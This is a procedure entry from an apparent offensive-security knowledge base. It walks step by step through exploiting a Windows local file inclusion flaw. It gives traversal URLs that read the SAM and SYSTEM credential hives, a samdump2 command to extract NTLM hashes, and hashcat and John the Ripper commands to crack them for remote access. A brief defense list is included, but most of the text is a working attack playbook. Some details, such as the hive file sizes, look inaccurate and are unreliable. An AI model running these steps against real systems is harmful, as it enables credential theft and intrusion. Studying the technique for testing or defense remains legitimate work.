---
id: 8b712953-5957-4fa9-9c01-af737e58f9d8
name: Windows-LFI-to-RCE-via-Credentials-Files
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.678261+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/File Inclusion]]'
  - '[[tags/LFI to RCE via credentials files]]'
  - '[[tags/Windows version]]'
  - lfi
  - windows
  - credential-access
commands:
  - '[[commands/samdump2-extract-hashes-from-sam-system]]'
  - '[[commands/hashcat-crack-ntlm-hashes]]'
  - '[[commands/john-crack-ntlm-hashes]]'
platforms:
  - Windows
tools:
  - '[[tools/samdump2]]'
  - '[[tools/Hashcat]]'
  - '[[tools/john-the-ripper]]'
validated: true
---

# Windows-LFI-to-RCE-via-Credentials-Files

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in a web application on a Windows target to read sensitive credential files like SAM and SYSTEM from the Windows repair directory. The extracted files are then processed to dump NTLM password hashes, which can be cracked offline to obtain plaintext credentials for remote code execution (RCE) or lateral movement.

## Description

Local File Inclusion vulnerabilities allow attackers to include and execute files from the server's local filesystem via manipulated input parameters, such as a 'page' or 'file' query string in a web application. On Windows systems, targeting paths like `..\..\..\WINDOWS\repair\sam` and `system` can expose the SAM (Security Accounts Manager) database containing user hashes and the SYSTEM hive with encryption keys. Once downloaded, tools like samdump2 combine these files to extract crackable NTLM hashes. Cracking these hashes with tools like Hashcat or John the Ripper reveals passwords, enabling RCE via tools like PsExec or WMI. This technique is effective against misconfigured IIS or PHP applications without proper path traversal sanitization, leading to credential theft and privilege escalation in domain environments.

## Requirements

1. Access to a vulnerable web application with LFI (e.g., unauthenticated user able to manipulate file inclusion parameters).
2. Knowledge of the target Windows system's filesystem structure (typically C:\WINDOWS\repair\).
3. Local attacker machine with tools: samdump2, Hashcat or John the Ripper, and a wordlist like rockyou.txt.
4. Network access to the web application (e.g., HTTP/HTTPS on port 80/443).

## Defense

- Implement strict input validation and sanitization to block path traversal sequences (e.g., use whitelists for includable files).
- Restrict web application permissions to prevent reading sensitive system files (e.g., remove IIS_IUSRS access to C:\WINDOWS\repair\).
- Enable Windows Security Auditing for file access and monitor for anomalous reads of SAM/SYSTEM files.
- Use full-disk encryption (e.g., BitLocker) and strong password policies to mitigate hash cracking.
- Deploy web application firewalls (WAF) to detect LFI patterns like '../' sequences.

## Objectives

1. Exploit LFI to retrieve SAM and SYSTEM files from the target Windows system.
2. Extract NTLM password hashes from the retrieved files.
3. Crack the hashes to obtain plaintext credentials for RCE or lateral movement.
4. Achieve remote access to the target or escalated privileges on the network.

## Instructions

### Step 1: Exploit LFI to Retrieve SAM File

**Context**: Use the LFI vulnerability to include and download the SAM file from the Windows repair directory. This file contains local user account hashes. Craft a URL that traverses directories to reach `C:\WINDOWS\repair\sam` and capture the output via browser or proxy.

**Code** ([[codes/windows-lfi-requests-to-sam-and-system]]):

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
```

> Replace `example.com` with the vulnerable application's URL. Use a tool like Burp Suite to intercept and save the response as `sam` file. Expected output: Binary content of the SAM hive file (approximately 4-16 MB, starting with registry headers).

### Step 2: Exploit LFI to Retrieve SYSTEM File

**Context**: Similarly, include the SYSTEM file which holds the boot key necessary to decrypt SAM hashes. This step must be performed immediately after Step 1 to ensure file consistency.

**Code** ([[codes/windows-lfi-requests-to-sam-and-system]]):

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

> Capture the response and save as `system` file. Expected output: Binary content of the SYSTEM hive (around 10-50 MB).

### Step 3: Extract Hashes Using samdump2

**Context**: Combine the downloaded SAM and SYSTEM files to dump NTLM hashes. samdump2 uses the SYSTEM boot key to decrypt the hashes from SAM.

**Command** ([[commands/samdump2-extract-hashes-from-sam-system]]):

```bash
samdump2 SYSTEM SAM > hashes.txt
```

> Run this on the attacker's local machine with the saved files. Expected output: A text file `hashes.txt` containing lines like `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`, where the second field after the username is the LM hash and the third is NT hash.

### Step 4: Crack Hashes Using Hashcat

**Context**: Attempt to crack the NTLM hashes offline using a dictionary attack with a common wordlist. This reveals plaintext passwords for high-value accounts like Administrator.

**Command** ([[commands/hashcat-crack-ntlm-hashes]]):

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
```

> Use mode 1000 for NTLM. Expected output: Cracked passwords displayed as `username:password` if successful, or status updates on attempts.

### Step 5: Alternative Cracking Using John the Ripper

**Context**: If Hashcat is unavailable, use John for cracking. This provides similar functionality with incremental or dictionary modes.

**Command** ([[commands/john-crack-ntlm-hashes]]):

```bash
john --format=NT hashes.txt --wordlist=rockyou.txt
```

> Expected output: Progress updates and cracked passwords shown with `john --show hashes.txt` afterward.
